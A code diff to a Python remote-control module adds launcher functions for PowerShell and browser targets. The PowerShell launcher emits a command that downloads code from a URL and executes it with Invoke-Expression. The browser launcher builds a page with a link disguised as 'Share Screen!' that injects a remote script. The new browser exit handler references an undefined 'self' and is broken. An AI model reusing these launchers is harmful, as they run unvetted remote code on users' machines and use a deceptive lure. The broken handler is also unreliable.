@@ -5,12 +5,15 @@ import json
 import base64
 import requests
 
-from autologging import traced
 
 from brainslug.ribosome import define, root
 
 
 powershell = root('powershell')
+
+@define(powershell.launch)
+def _(remote, url, **kwargs):
+    return f"Invoke-Command -ScriptBlock (Invoke-Expression (Invoke-WebRequest {url} -UseBasicParsing).content)"
 
 
 @define(powershell.boot)
@@ -56,6 +59,11 @@ def _(remote, name, value):
 @define(powershell.delitem)
 def _(remote, name):
     return remote.eval(f"$CTX.Remove({name!r})")
+
+
+@define(powershell.sys.exit)
+def _(remote, code):
+    remote.eval("exit", ignore_result=True)
 
 
 @define(powershell.eval)
@@ -247,6 +255,27 @@ def _(remote, x, y, button='left'):
 browser = root('browser')
 
 
+@define(browser.launch)
+def _(remote, url, **kwargs):
+    return f"""
+    <html>
+    <body>
+    <a href="javascript:(function(){{st=document.createElement('script');st.src='{url}';document.head.appendChild(st);}})();">Share Screen!</a>
+    </body>
+    </html>
+    """
+
+
+@define(browser.sys.exit)
+def _(remote, code):
+    self.remote.eval("""
+        (res) => {
+            window.close();
+            res();
+        }""",
+        ignore_result=True)
+
+
 @define(browser.boot)
 def _(remote, url, **kwargs):
     return (f"""
@@ -265,7 +294,6 @@ def _(remote, url, **kwargs):
 
 
 @define(browser.eval)
-@traced
 def _(remote, code, ignore_result=False):
     result = remote.__eval__(code.encode('utf-8'))
     if not ignore_result:
